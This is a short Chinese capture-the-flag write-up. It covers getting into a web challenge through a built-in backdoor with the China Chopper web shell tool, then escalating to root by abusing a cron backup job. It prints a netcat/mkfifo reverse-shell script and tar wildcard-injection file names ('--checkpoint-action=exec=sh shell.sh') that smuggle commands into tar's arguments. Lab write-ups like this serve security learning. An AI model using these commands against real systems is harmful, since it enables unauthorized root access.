扫目录得到源码

内置后门

菜刀连上

`python -c 'import pty;pty.spawn("/bin/bash")'`创建流，方便切换用户交互

根目录：/flag_here的提示内容，flag在/root/下，需要提权。可以登录到用户actf

查看到`/etc/crontab`中有一个定时任务`/etc/cron.daily/backup`

利用此定时任务提权，在/home/actf/目录下执行：

```
nc -lp 8888 -vv

echo "mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0</tmp/jvenbd | /bin/sh >/tmp/jvenbd 2>&1; rm /tmp/jvenbd" > shell.sh && chmod +x shell.sh
echo > "--checkpoint-action=exec=sh shell.sh"
echo > "--checkpoint=1"
```

即可得到root用户的shell，拿到flag

其他主机层面的提权没试过。。